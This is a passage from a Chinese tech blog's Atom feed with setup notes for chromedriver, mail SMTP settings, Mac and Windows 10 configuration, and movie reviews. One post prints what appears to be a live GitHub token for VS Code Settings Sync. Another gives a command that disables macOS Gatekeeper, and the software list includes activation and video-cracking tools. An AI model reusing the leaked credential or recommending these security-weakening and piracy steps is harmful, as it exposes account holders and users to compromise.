title="步骤"></a>步骤</h2><ol><li><p>下载文件： <a href="http://security.debian.org/debian-security/pool/updates/main/c/chromium/chromium-driver_72.0.3626.122-1~deb9u1_armhf.deb" target="_blank" rel="noopener">http://security.debian.org/debian-security/pool/updates/main/c/chromium/chromium-driver_72.0.3626.122-1~deb9u1_armhf.deb</a></p></li><li><p><code>sudo dpkg -i chromium-driver_72.0.3626.122-1~deb9u1_armhf.deb</code></p></li></ol><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"># sudo chmod +x &#x2F;usr&#x2F;local&#x2F;bin&#x2F;chromedriver</span><br><span class="line"># sudo apt-get install libminizip1</span><br><span class="line"># sudo apt-get install libwebpmux2</span><br><span class="line"># sudo apt-get install libgtk-3-0</span><br><span class="line"></span><br></pre></td></tr></table></figure>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;树莓派下载&quot;&gt;&lt;a href=&quot;#树莓派下载&quot; class=&quot;headerlink&quot; title=&quot;树莓派下载&quot;&gt;&lt;/a&gt;树莓派下载&lt;/h2&gt;&lt;ul&gt;
&lt;li&gt;官方下载链接： &lt;a href=&quot;https://www.raspberrypi.org/downloa</summary>
      
    
    
    
    <category term="开发工具" scheme="https://seniortesting.club/categories/%E5%BC%80%E5%8F%91%E5%B7%A5%E5%85%B7/"/>
    
    
    <category term="java" scheme="https://seniortesting.club/tags/java/"/>
    
    <category term="selenium" scheme="https://seniortesting.club/tags/selenium/"/>
    
  </entry>
  
  <entry>
    <title>流行视频剪辑工具对比评测及其选型</title>
    <link href="https://seniortesting.club/posts/0pEYHA5QaZ/"/>
    <id>https://seniortesting.club/posts/0pEYHA5QaZ/</id>
    <published>2021-03-25T15:12:53.000Z</published>
    <updated>2021-04-18T13:00:39.459Z</updated>
    
    <content type="html"><![CDATA[<h2 id="视频剪辑工具"><a href="#视频剪辑工具" class="headerlink" title="视频剪辑工具"></a>视频剪辑工具</h2><table><thead><tr><th>工具</th><th>优势</th><th>劣势</th></tr></thead><tbody><tr><td>PR</td><td>功能全</td><td>复杂</td></tr><tr><td>喵影工厂</td><td>功能全，素材多</td><td>有些功能缺失，比如自动生成字幕</td></tr><tr><td>蜜蜂剪辑</td><td>功能全，无素材</td><td>简单</td></tr></tbody></table><h2 id="万兴神剪手"><a href="#万兴神剪手" class="headerlink" title="万兴神剪手"></a>万兴神剪手</h2><p> 1.音频资源需要到官网单独下载，下载后默认音频资源目录：<code>C:\ProgramData\Wondershare Filmora</code><br> 2. 默认项目相关配置资源目录: <code>C:\Users\Administrator\Documents\Wondershare Filmora 9</code></p><h3 id="1-学习技巧"><a href="#1-学习技巧" class="headerlink" title="1. 学习技巧"></a>1. 学习技巧</h3><table><thead><tr><th>名称</th><th>技巧</th></tr></thead><tbody><tr><td>马赛克</td><td>全场马赛克，局部马赛克需要点击一下</td></tr><tr><td>锁定视频</td><td>锁定后视频不能编辑</td></tr><tr><td>复制</td><td>需要先点击选中对应的轨道，否则复制后会默认复制到第一个时间轨道上</td></tr><tr><td>录屏放大缩小效果</td><td>录制的时候注意的地方停顿8秒以上，这样可以用于剪辑<br/>需要切割需要放大的区域，然后在进入的时候进入放大效果，离开的时候加入退出全屏的效果。也可以通过在中间放一个静态图片方式,参考：</td></tr><tr><td>9：16小视频制作</td><td><a href="https://zhuanlan.zhihu.com/p/102681737" target="_blank" rel="noopener">https://zhuanlan.zhihu.com/p/102681737</a></td></tr></tbody></table><h2 id="蜜蜂剪辑"><a href="#蜜蜂剪辑" class="headerlink" title="蜜蜂剪辑"></a>蜜蜂剪辑</h2><ol><li>音频下载后默认的资源目录： <code>C:\Users\Administrator\AppData\Roaming\Apowersoft\BeeCut\Musics</code></li></ol><h2 id="BGM专区"><a href="#BGM专区" class="headerlink" title="BGM专区"></a>BGM专区</h2><p>音频资源可以在百度云里面进行搜索。在网易云音乐中试听。</p><ol><li>点点文档： <a href="https://www.torrent.org.cn/bd" target="_blank" rel="noopener">https://www.torrent.org.cn/bd</a></li></ol><h3 id="大气高潮"><a href="#大气高潮" class="headerlink" title="大气高潮"></a>大气高潮</h3><ol><li>十大气势磅礴背景音乐: <a href="https://www.douban.com/group/topic/74855809/" target="_blank" rel="noopener">https://www.douban.com/group/topic/74855809/</a></li></ol><table><thead><tr><th>名称</th><th>来源</th><th>描述</th></tr></thead><tbody><tr><td>Conquest Of Paradise</td><td>范吉利斯（Vangelis）征服天堂</td><td>讲述哥伦布征服南美洲故事.<br> 1. 史诗般的气派，完全是慑人的感觉，节奏低层缓慢<br> 2. 势恢宏的交响氛围震撼,热血沸腾,奋不顾身的冲向炮火，舍生取义</td></tr><tr><td>He‘s a pirate</td><td>《加勒比海盗》克劳斯巴德尔特 Klaus Badelt</td><td>Jack船长将剧情推向高潮.<br> 1. 世界末日到来，群起奋斗杀敌，节奏快速;<br> 2.视死如归，热血沸腾，豪迈气势,奋勇杀敌;<br></td></tr><tr><td>she is my sin</td><td>芬兰乐团夜愿Nightwish，专辑《Wishmaster》</td><td>作为现场演唱<br></td></tr><tr><td>the dawn</td><td>原意为黎明、拂晓、破晓，被魔兽玩家们称为“亡灵序曲”</td><td>金属音乐表达的就是沉迷于对死亡、黑暗和痛苦的情感</td></tr><tr><td>The Mass</td><td>法国现代乐团Era</td><td>法国宗教（天主教会）音乐.一些人将其误传为纳粹军歌、亨德尔《弥赛亚》中的曲目.它与德国知名音乐家和小提琴手卡尔·奥尔夫（Carl Orff）受盛赞的作品《Carmina Burana》（布兰诗歌）步调一致。</td></tr><tr><td>Hero’s Theme</td><td>B3</td><td>C3</td></tr><tr><td>rock house jail</td><td>B3</td><td>C3</td></tr><tr><td>hummell gets the rockets</td><td>B3</td><td>C3</td></tr><tr><td>in the tunnels</td><td>B3</td><td>C3</td></tr><tr><td>halo theme mjolnir mix</td><td>B3</td><td>C3</td></tr></tbody></table><ol start="2"><li>其他气势音乐</li></ol><table><thead><tr><th>名称</th><th>来源</th><th>描述</th></tr></thead><tbody><tr><td>Bye Bye Beautiful</td><td>芬兰乐团夜愿Nightwish</td><td>高潮点，超燃，高潮。</td></tr></tbody></table>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;视频剪辑工具&quot;&gt;&lt;a href=&quot;#视频剪辑工具&quot; class=&quot;headerlink&quot; title=&quot;视频剪辑工具&quot;&gt;&lt;/a&gt;视频剪辑工具&lt;/h2&gt;&lt;table&gt;
&lt;thead&gt;
&lt;tr&gt;
&lt;th&gt;工具&lt;/th&gt;
&lt;th&gt;优势&lt;/th&gt;
&lt;th&gt;劣势&lt;/th&gt;
</summary>
      
    
    
    
    <category term="开发工具" scheme="https://seniortesting.club/categories/%E5%BC%80%E5%8F%91%E5%B7%A5%E5%85%B7/"/>
    
    
  </entry>
  
  <entry>
    <title>各种主流邮件服务商配置</title>
    <link href="https://seniortesting.club/posts/9RV7eY5hlJ/"/>
    <id>https://seniortesting.club/posts/9RV7eY5hlJ/</id>
    <published>2021-03-25T15:12:53.000Z</published>
    <updated>2021-04-18T13:00:39.459Z</updated>
    
    <content type="html"><![CDATA[<p>相关参考模板说明： <a href="https://juejin.im/post/5b598eccf265da0f4e62dfbc" target="_blank" rel="noopener">freemarker使用</a></p><ol><li>变量语法类似于javascript中的${} 语法</li></ol><h2 id="Gmail"><a href="#Gmail" class="headerlink" title="Gmail"></a>Gmail</h2><p>用户密码设置：</p><p>发件服务器地址：</p><p>SMTP 服务器地址：smtp.gmail.com 端口: 25， SSL 加密端口: 465</p><p>Port for TLS/STARTTLS: 587<br>Port for SSL: 465</p><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># gmail：</span></span><br><span class="line">   <span class="attr">protocol:</span> <span class="string">smtp</span></span><br><span class="line">   <span class="attr">host:</span> <span class="string">smtp.gmail.com</span></span><br><span class="line">   <span class="comment"># ssl: 465 ,or 25</span></span><br><span class="line">   <span class="attr">port:</span> <span class="number">465</span></span><br><span class="line">   <span class="attr">username:</span> <span class="string">alterhu2020@gmail.com</span></span><br><span class="line">   <span class="attr">password:</span> <span class="string">ENC(84rFTtest3pgzhm494YfMtestcwQxWWPXOZqjLqHq5wIbh0fCiqNM=)</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><h2 id="QQ"><a href="#QQ" class="headerlink" title="QQ"></a>QQ</h2><p>参考配置文档： <a href="https://blog.csdn.net/qq_37991944/article/details/103651197" target="_blank" rel="noopener">https://blog.csdn.net/qq_37991944/article/details/103651197</a></p><p>在开启服务中选择开启POP3/SMTP服务，并将产生的smtp授权码（发送邮件的代码中会用到）复制</p><h2 id="阿里云邮箱"><a href="#阿里云邮箱" class="headerlink" title="阿里云邮箱"></a>阿里云邮箱</h2><p>参考地址是： </p><ul><li><p><a href="https://help.aliyun.com/knowledge_detail/36576.html?spm=a2c4g.11186631.2.3.433744fdFk5ywM" target="_blank" rel="noopener">https://help.aliyun.com/knowledge_detail/36576.html?spm=a2c4g.11186631.2.3.433744fdFk5ywM</a></p></li><li><p><a href="https://help.aliyun.com/knowledge_detail/36687.html?spm=a2c4g.11186623.4.1.11d95ed8Bnx84N" target="_blank" rel="noopener">https://help.aliyun.com/knowledge_detail/36687.html?spm=a2c4g.11186623.4.1.11d95ed8Bnx84N</a></p></li></ul><p>企业云邮箱各个服务器地址及端口信息如下：</p><ol><li>收件服务器地址：</li></ol><p>1.1 POP 服务器地址：pop3.mxhichina.com 端口110，SSL 加密端口995</p><p>或</p><p>1.2 IMAP 服务器地址：imap.mxhichina.com 端口143，SSL 加密端口993</p><ol start="2"><li>发件服务器地址：</li></ol><p>2.1 SMTP 服务器地址：smtp.mxhichina.com 端口: 25， SSL 加密端口: 465</p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;相关参考模板说明： &lt;a href=&quot;https://juejin.im/post/5b598eccf265da0f4e62dfbc&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;freemarker使用&lt;/a&gt;&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;变量语法类似于j</summary>
      
    
    
    
    <category term="开发工具" scheme="https://seniortesting.club/categories/%E5%BC%80%E5%8F%91%E5%B7%A5%E5%85%B7/"/>
    
    
    <category term="java" scheme="https://seniortesting.club/tags/java/"/>
    
    <category term="javascript" scheme="https://seniortesting.club/tags/javascript/"/>
    
  </entry>
  
  <entry>
    <title>Mac机器或者虚拟机相关配置配置</title>
    <link href="https://seniortesting.club/posts/VfFImdOrwW/"/>
    <id>https://seniortesting.club/posts/VfFImdOrwW/</id>
    <published>2021-03-25T15:12:53.000Z</published>
    <updated>2021-04-18T13:00:39.459Z</updated>
    
    <content type="html"><![CDATA[<p>相关参考模板说明： <a href="https://juejin.im/post/5b598eccf265da0f4e62dfbc" target="_blank" rel="noopener">freemarker使用</a></p><ol><li>变量语法类似于javascript中的${} 语法</li></ol><h2 id="允许来自任何地方的软件安装"><a href="#允许来自任何地方的软件安装" class="headerlink" title="允许来自任何地方的软件安装"></a>允许来自任何地方的软件安装</h2><p>先查看”设置”-&gt;”安全性与隐私”中是不是”允许任何来源”,如果不存在该选项。</p><ol><li>在终端中输入<code>sudo spctl --master-disable</code>指令</li><li>验证密码之后即可重新开启”允许任何来源”的选项</li><li>最后可以重启后重试</li></ol><h2 id="增强工具安装失败"><a href="#增强工具安装失败" class="headerlink" title="增强工具安装失败"></a>增强工具安装失败</h2><ol><li>查看安装日志文件<code>/private/var/log/install.log</code>,或者“访达”-》“应用工具”-》“实用工具”-&gt; “控制台”-》“日志报告”</li></ol><p>目前没有找到解决方法，直接使用百度网盘暂时。</p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;相关参考模板说明： &lt;a href=&quot;https://juejin.im/post/5b598eccf265da0f4e62dfbc&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;freemarker使用&lt;/a&gt;&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;变量语法类似于j</summary>
      
    
    
    
    <category term="操作系统" scheme="https://seniortesting.club/categories/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F/"/>
    
    
    <category term="java" scheme="https://seniortesting.club/tags/java/"/>
    
    <category term="javascript" scheme="https://seniortesting.club/tags/javascript/"/>
    
  </entry>
  
  <entry>
    <title>Windows10机器新环境配置</title>
    <link href="https://seniortesting.club/posts/kfLFrwbfBt/"/>
    <id>https://seniortesting.club/posts/kfLFrwbfBt/</id>
    <published>2021-03-25T15:12:53.000Z</published>
    <updated>2021-04-18T13:00:39.459Z</updated>
    
    <content type="html"><![CDATA[<h2 id="软件列表"><a href="#软件列表" class="headerlink" title="软件列表"></a>软件列表</h2><h3 id="装机系统软件"><a href="#装机系统软件" class="headerlink" title="装机系统软件"></a>装机系统软件</h3><ul><li><p>激活工具</p></li><li><p><a href="https://www.google.com/chrome/?extra=canarychannel&standalone=1" target="_blank" rel="noopener">Chrome Canary</a></p><ol><li>tampermonkey<ul><li>( 懒人专用，全网VIP视频免费破解去广告、全网音乐直接下载、百度网盘直接下载、知乎视频下载等多合一版。长期更新，放心使用。)</li><li>JAV老司机</li></ul></li><li>Free Download Manager</li><li>Octotree</li><li>Vue Devtools</li><li>ChroPath</li><li>掘金</li><li>谷歌上网助手</li><li>Wappalyzer</li><li>Momentum</li></ol></li><li><p><a href="https://www.shrew.net/download/vpn/vpn-client-2.2.2-release.exe" target="_blank" rel="noopener">VPN客户端</a></p></li><li><p><a href="https://www.wps.cn/" target="_blank" rel="noopener">WPS</a></p></li><li><p><a href="https://www.microsoft.com/en-us/p/onenote/9wzdncrfhvjl" target="_blank" rel="noopener">OneNote</a></p></li><li><p><a href="https://www.mozilla.org/en-US/firefox/new/" target="_blank" rel="noopener">Firefox</a></p></li><li><p><a href="https://www.huorong.cn/person5.html" target="_blank" rel="noopener">火绒杀毒</a></p></li><li><p><a href="https://www.freedownloadmanager.org/download.htm" target="_blank" rel="noopener">Free Download Manager</a></p></li><li><p><a href="https://www.7-zip.org/download.html" target="_blank" rel="noopener">7Zip</a></p></li><li><p><a href="https://www.chuyu.me/" target="_blank" rel="noopener">Dism++</a></p></li></ul><h2 id="开发工具"><a href="#开发工具" class="headerlink" title="开发工具"></a>开发工具</h2><ul><li><p><a href="https://adoptopenjdk.net/?variant=openjdk11&jvmVariant=hotspot" target="_blank" rel="noopener">AdoptOpenJDK 11</a></p></li><li><p><a href="https://www.jetbrains.com/idea/download/" target="_blank" rel="noopener">Jetbrains IDEA</a></p><ul><li>插件<ol><li>Alibaba Java Coding Guidelines</li><li>Lombok</li><li>Maven Helper</li><li>Mybatis Log Plugin</li><li>MybatisCodeHelperPro</li><li>Python</li><li>Vue.js</li><li>Wake Time</li><li>Any Rule</li></ol></li></ul></li><li><p><a href="https://dcloud.io/" target="_blank" rel="noopener">HBuilderX</a></p></li><li><p><a href="https://code.visualstudio.com/download" target="_blank" rel="noopener">VS Code</a></p><ul><li>Markdown相关插件<br> 1.1 Markdown PDF<br> 1.2 Markdown Preview Enhanced<br> 1.3 Markdown Shortcuts<br> 1.4 markdownlint<br> 1.5 vscode-pdf<br> 1.6 PicGo （配置操作: <a href="https://code.seniortesting.club/blog/setup/how-setup-picgo-vscode.html" target="_blank" rel="noopener">https://code.seniortesting.club/blog/setup/how-setup-picgo-vscode.html</a> )<br> 1.7 Visual Studio IntelliCode<br> 1.8 Python<br> 1.9 Impornt Cost<br> 1.10 Settings Sync, token: 88b53e726d32e7125a784d90a2ba0d2e73678164, gist: 9a957602da106a377142305bcb2f3e65<br>1.11 Live Server<br>1.12 Debugger for Chrome<br>1.13 Live Sass Compiler<br>1.14 Lorem ipsum<br>1.15 CSS Peek<br>1.16 IntelliSense for CSS class names in HTML<br>1.17 <a href="https://marketplace.visualstudio.com/items?itemName=TakumiI.markdowntable" target="_blank" rel="noopener">Markdown Table</a></li></ul></li><li><p><a href="https://www.virtualbox.org/wiki/Downloads" target="_blank" rel="noopener">Oracle VirtualBox</a></p></li><li><p><a href="https://nodejs.org/en/download/" target="_blank" rel="noopener">Node</a></p></li><li><p><a href="https://www.python.org/ftp/python/3.8.2/" target="_blank" rel="noopener">Python 3.8.2</a></p></li><li><p><a href="http://tomcat.apache.org/" target="_blank" rel="noopener">Apache Tomcat9</a></p></li><li><p><a href="https://maven.apache.org/download.cgi" target="_blank" rel="noopener">Apache Maven</a></p></li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;&#x2F; user&#x2F;.m2&#x2F;settings.xml</span><br><span class="line"> &lt;localRepository&gt;E:\MavenRepository&lt;&#x2F;localRepository&gt;</span><br></pre></td></tr></table></figure><ul><li><a href="https://gradle.org/" target="_blank" rel="noopener">Gradle-Android开发</a></li><li><a href="https://www.telerik.com/download/fiddler" target="_blank" rel="noopener">Fiddler</a></li><li><a href="https://www.devart.com/dbforge/mysql/studio/download.html" target="_blank" rel="noopener">dbForge Studio for MySQL</a></li><li><a href="https://git-scm.com/download/win" target="_blank" rel="noopener">Git</a></li><li><a href="https://tortoisegit.org/download/" target="_blank" rel="noopener">TortoiseGit</a></li><li><a href="https://www.sourcetreeapp.com/" target="_blank" rel="noopener">Source Tree</a></li><li><a href="https://www.netsarang.com/en/xshell-download/" target="_blank" rel="noopener">Xshell</a></li><li><a href="http://docs.redisdesktop.com/en/latest/" target="_blank" rel="noopener">Redis Desktop Manager</a></li><li><a href="https://www.adobe.com/products/photoshop/free-trial-download.html" target="_blank" rel="noopener">Adobe Photoshop CC 2018</a></li><li><a href="https://github.com/fatedier/frp" target="_blank" rel="noopener">frp</a></li><li><a href="https://ngrok.com/download" target="_blank" rel="noopener">ngrok</a></li><li><a href="https://developers.weixin.qq.com/miniprogram/dev/devtools/download.html" target="_blank" rel="noopener">微信开发者工具</a></li><li><a href="https://github.com/aliyun/oss-browser" target="_blank" rel="noopener">aliyun OSS Browser</a></li><li><a href="https://bootstrapstudio.io/" target="_blank" rel="noopener">Bootstrap Studio</a></li><li><a href="https://www.mongodb.com/download-center" target="_blank" rel="noopener">MongoDB</a></li><li><a href="https://github.com/crawlab-team/artipub" target="_blank" rel="noopener">artipub-多平台文章发布</a></li><li><a href="https://www.faststone.org/FSCaptureDetail.htm" target="_blank" rel="noopener">FastStoneCapturePortable</a></li><li><a href="http://www.houyicaiji.com/?type=download" target="_blank" rel="noopener">后裔采集器</a></li><li><a href="https://xft.fzxgj.top/" target="_blank" rel="noopener">小飞兔整站下载</a></li><li><a href="https://www.advanced-ip-scanner.com/index2.php" target="_blank" rel="noopener">Advanced IP Scanner</a></li><li><a href="https://www.realvnc.com/" target="_blank" rel="noopener">RealVNC</a></li><li><a href="https://sourceforge.net/projects/win32diskimager/" target="_blank" rel="noopener">Win32DiskImager</a></li><li><a href="https://www.xp.cn/" target="_blank" rel="noopener">PhpStudy</a></li><li><a href="http://m.note.youdao.com/" target="_blank" rel="noopener">有道云笔记</a></li><li><a href="https://cloud.tencent.com/product/ms" target="_blank" rel="noopener">应用宝乐固加固</a></li></ul><h3 id="娱乐工具"><a href="#娱乐工具" class="headerlink" title="娱乐工具"></a>娱乐工具</h3><ul><li><a href="https://github.com/ytdl-org/youtube-dl" target="_blank" rel="noopener">m3u8 downloader-youtube-dl.exe</a></li><li><a href="https://daumpotplayer.com/download/" target="_blank" rel="noopener">PotPlayer</a></li><li><a href="https://pan.baidu.com/download" target="_blank" rel="noopener">百度网盘</a></li><li><del><a href="https://pandownload.com/" target="_blank" rel="noopener">PanDownload</a></del></li><li><a href="https://im.qq.com/download/" target="_blank" rel="noopener">QQ</a></li><li><a href="https://pc.weixin.qq.com/" target="_blank" rel="noopener">微信桌面版</a></li><li><a href="http://www.rrys2019.com/" target="_blank" rel="noopener">人人影视</a></li><li><a href="https://www.xunlei.com/" target="_blank" rel="noopener">迅雷</a><br><a href="https://www.google.com/earth/versions/" target="_blank" rel="noopener">Google Earth</a></li></ul><p>最新更新： 推荐直接使用 <a href="https://github.com/PowerShell/PowerShell/releases" target="_blank" rel="noopener">PowerShell 7</a></p><h2 id="下载安装"><a href="#下载安装" class="headerlink" title="下载安装"></a>下载安装</h2><ol><li>官方提示需要先安装： <a href="https://www.microsoft.com/en-us/download/details.aspx?id=53175" target="_blank" rel="noopener">Desktop Bridge VC++ v14 Redistributable Package</a></li><li>在<a href="https://github.com/microsoft/terminal" target="_blank" rel="noopener">microsoft/terminal</a>仓库下载对应的terminal文件，打开<code>powershell</code>命令行执行命令如下安装:</li></ol><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&gt; Add-AppxPackage .\Microsoft.WindowsTerminalPreview_1.3.2382.0_8wekyb3d8bbwe.msixbundle</span><br></pre></td></tr></table></figure><h2 id="配置使用"><a href="#配置使用" class="headerlink" title="配置使用"></a>配置使用</h2><p>WT 好处都有啥？<br>根据官方介绍，Windows Terminal 是一个<strong>面向命令行用户的全新、现代化、功能丰富的高性能终端应用程序</strong>。它在实现了社区用户热切期望的许多功能的同时（包括多标签页、富文本、全球化、可配置性、对主题与样式的支持等），依然保持快速与高效，不会消耗大量的内存或电量。</p><p>安装完成后可以直接在开始菜单中找到，“Window Terminal Preview”.</p><ol><li>添加右键菜单</li></ol><p>2020年0915日最新更新： 参考此脚本： <a href="https://github.com/lextm/windowsterminal-shell" target="_blank" rel="noopener">https://github.com/lextm/windowsterminal-shell</a></p><p>不过我还是比较习惯传统的右键菜单「在这里打开终端」的方式。WT 目前还没有内置这一功能，想要手动添加也比较麻烦（下文参考了这个 <a href="https://github.com/microsoft/terminal/issues/1060" target="_blank" rel="noopener">issue</a>中的方法）。</p><p>以管理员权限打开 PowerShell，运行以下命令：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">$basePath &#x3D; &quot;Registry::HKEY_CLASSES_ROOT\Directory\Background\shell&quot;</span><br><span class="line">New-Item -Path &quot;$basePath\wt&quot; -Force -Value &quot;Windows Terminal here&quot;</span><br><span class="line">New-ItemProperty -Path &quot;$basePath\wt&quot; -Force -Name &quot;Icon&quot; -PropertyType ExpandString -Value &quot;%LOCALAPPDATA%\Microsoft\WindowsApps\terminal.ico&quot;</span><br><span class="line">New-Item -Path &quot;$basePath\wt\command&quot; -Force -Type ExpandString -Value &#39;&quot;%LOCALAPPDATA%\Microsoft\WindowsApps\wt.exe&quot; -p Ubuntu -d &quot;%V&quot;&#39;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>如果你足够熟练，也可以自行通过其他方式修改注册表，反正就那么些字段，路径正确就行了。Windows Terminal 的图标可以在 <a href="https://raw.githubusercontent.com/microsoft/terminal/master/res/terminal.ico" target="_blank" rel="noopener">这里</a> 获取 。</p><blockquote><p>2020/03/14 更新：Windows Terminal 0.9 版本之后添加了 wt.exe 的命令行参数，可以直接指定启动目录，不需要再修改 profiles.json 中的 <code>startingDirectory</code> 字段了。</p></blockquote><p>另外 wt.exe 支持通过<code>-p</code>参数指定要打开的 Profile，所以除了 WSL，我还添加了一个在当前目录下打开 PowerShell 的菜单项（注册表中添加一个 Extended 项可以让该右键菜单项仅在按住 Shift 右键时才显示）。你甚至可以通过二级菜单的方式实现更多功能，具体可以参考上面给出的 issue 中的讨论。</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;软件列表&quot;&gt;&lt;a href=&quot;#软件列表&quot; class=&quot;headerlink&quot; title=&quot;软件列表&quot;&gt;&lt;/a&gt;软件列表&lt;/h2&gt;&lt;h3 id=&quot;装机系统软件&quot;&gt;&lt;a href=&quot;#装机系统软件&quot; class=&quot;headerlink&quot; title=&quot;装机系统软</summary>
      
    
    
    
    <category term="操作系统" scheme="https://seniortesting.club/categories/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F/"/>
    
    
    <category term="python" scheme="https://seniortesting.club/tags/python/"/>
    
    <category term="vue" scheme="https://seniortesting.club/tags/vue/"/>
    
    <category term="java" scheme="https://seniortesting.club/tags/java/"/>
    
  </entry>
  
  <entry>
    <title>何为优秀视频?</title>
    <link href="https://seniortesting.club/posts/gKjXMzR7AA/"/>
    <id>https://seniortesting.club/posts/gKjXMzR7AA/</id>
    <published>2021-03-25T15:12:53.000Z</published>
    <updated>2021-04-18T13:00:39.467Z</updated>
    
    <content type="html"><![CDATA[<h2 id="何为优秀"><a href="#何为优秀" class="headerlink" title="何为优秀?"></a>何为优秀?</h2><p>知名编剧张小北说，好的电影，技术层面上要有突破，<strong>内容层面要有情怀与灵魂</strong>，最重要的是，能够<strong>激发观众内心“最隐秘的欲望”</strong>。也有人直言观影一事属个人审美，判断一部电影的好坏，最主要的是“看得爽不爽”。而某些资深经典电影爱好者又说，<strong>所谓的好电影，那必定是经受得起时间考验的电影</strong>。总而言之，言而总之，大家的出发点不同，给出的答案也各有千秋。</p><p>对中国人来说，<strong>好的电影就是植根于深厚的中国文化土壤，像滋补靓汤，润物细无声</strong>。好莱坞的电影就像兴奋剂，一时的愉悦亢奋。法国片也好英国片也好，虽然都有宣扬“意识形态”的文化壁垒，但也都比美国片好。欧洲的文化底蕴还是要比“美利坚”肤浅的强盗逻辑要先进一点。</p><h2 id="优秀作品推荐"><a href="#优秀作品推荐" class="headerlink" title="优秀作品推荐"></a>优秀作品推荐</h2><h3 id="观看时间：-2019年6月29日"><a href="#观看时间：-2019年6月29日" class="headerlink" title="观看时间： 2019年6月29日"></a>观看时间： 2019年6月29日</h3><ul><li><strong>《冒牌上尉》</strong></li></ul><blockquote><p>其实谎话说多了，自己也会当真的！</p></blockquote><h3 id="观看时间：-2019年6月28日"><a href="#观看时间：-2019年6月28日" class="headerlink" title="观看时间： 2019年6月28日"></a>观看时间： 2019年6月28日</h3><ul><li><strong>《全能囧爸》</strong></li></ul><blockquote><p>被片名耽误的好电影</p></blockquote><h3 id="观看时间：-2019年6月22日"><a href="#观看时间：-2019年6月22日" class="headerlink" title="观看时间： 2019年6月22日"></a>观看时间： 2019年6月22日</h3><ul><li><strong>《地久天长》</strong>  </li></ul><blockquote><p>两个家庭因为一次意外，演绎一段不可思议的岁月。</p></blockquote><ul><li><strong>《雪暴》</strong></li></ul><blockquote><p>护林员随时有生命危险。。。</p></blockquote><h3 id="收听时间：-2019年6月21日"><a href="#收听时间：-2019年6月21日" class="headerlink" title="收听时间： 2019年6月21日"></a>收听时间： 2019年6月21日</h3><ul><li><strong>《我不能悲伤地坐在你身旁》</strong> - 左小祖咒</li><li><strong>《瞎子 - 尧十三》</strong></li><li><strong>《Lost Rivers》</strong>  - Sainkho Namtchylak</li></ul><h3 id="观看时间：-2019年6月19日"><a href="#观看时间：-2019年6月19日" class="headerlink" title="观看时间： 2019年6月19日"></a>观看时间： 2019年6月19日</h3><ul><li><strong>《沼泽怪物》</strong></li></ul><blockquote><p>沼泽怪物（Swamp Thing）是美国DC漫画旗下超级英雄，剧情目前看来还行。继续追剧中。。。</p></blockquote><h3 id="观看时间：-2019年6月18日"><a href="#观看时间：-2019年6月18日" class="headerlink" title="观看时间： 2019年6月18日"></a>观看时间： 2019年6月18日</h3><ul><li><strong>《无主之作》</strong></li></ul><blockquote><p>一部冷门佳片,透过小男孩寇克从小到大的一生，来看尽德国历经了三个时期战争及政权的转变。每一个人物都息息相关而且彼此牵绊着，命运的安排如同一个国家的改变，<strong>比起突如其来的机会，不如选择相信凡事都会有最好的安排</strong>。</p></blockquote><h3 id="观看时间：-2019年6月10日"><a href="#观看时间：-2019年6月10日" class="headerlink" title="观看时间： 2019年6月10日"></a>观看时间： 2019年6月10日</h3><ul><li><strong>《极地重生》</strong></li></ul><blockquote><p>讲的是二战纳粹德国失败后，被俘的科利经过重重障碍成功越狱，在被积雪覆盖的千里冰原，科利孤身进行的漫长的回家之路。除了信念还有遇到的帮助他的那些人，更多还是有运气，成就了一段非凡之路。</p></blockquote><h2 id="观看时间：-2019年6月8日"><a href="#观看时间：-2019年6月8日" class="headerlink" title="观看时间： 2019年6月8日"></a>观看时间： 2019年6月8日</h2><ul><li><strong>《切尔洛贝利》 - HBO出品</strong></li></ul><blockquote><p>几乎完整浮现这场人类历史上最大的核电事故，现场的真实呈现，除了震撼还是震撼。</p></blockquote><h2 id="观看时间：-2019年5月20日"><a href="#观看时间：-2019年5月20日" class="headerlink" title="观看时间： 2019年5月20日"></a>观看时间： 2019年5月20日</h2><ul><li><strong>《破冰行动》</strong></li></ul><blockquote><p>选择的是禁毒题材，前端的剧情还算紧张，后面的剧情基本都在预料之中，国内的电视剧还是不足以震撼和牵动人啊。</p></blockquote><h2 id="观看时间：-2019年4月14日"><a href="#观看时间：-2019年4月14日" class="headerlink" title="观看时间： 2019年4月14日"></a>观看时间： 2019年4月14日</h2><ul><li><strong>《权利的游戏》 -第八季</strong></li></ul><blockquote><p>尽管有些烂尾，仍然无法掩饰这部宏伟的作品。</p></blockquote>]]></content>
    
    
      
      
